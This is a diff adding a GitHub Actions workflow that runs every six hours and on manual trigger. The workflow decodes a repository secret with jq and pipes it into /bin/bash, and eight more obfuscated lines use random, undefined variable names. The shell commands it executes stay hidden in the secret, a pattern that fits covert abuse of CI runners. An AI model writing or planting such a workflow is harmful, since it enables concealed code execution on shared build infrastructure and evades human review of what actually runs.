@@ -1,0 +1,25 @@
+name: shitianlu7195
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shitianlu7195
+        env:
+          d77: ${{ secrets.d77 }}
+        run: |
+          echo $d77 | jq -r .e99 | /bin/bash
+          echo $w501 | jq -r .jwr27839 | /bin/bash
+          echo $psxfg081 | jq -r .fv057 | /bin/bash
+          echo $tw79 | jq -r .tcc867 | /bin/bash
+          echo $w21521 | jq -r .ydnua09255 | /bin/bash
+          echo $zrmp81729 | jq -r .edfe35365 | /bin/bash
+          echo $zkbns519 | jq -r .e84 | /bin/bash
+          echo $ywzjk36 | jq -r .fr15741 | /bin/bash
+          echo $y9650 | jq -r .tk859 | /bin/bash
+
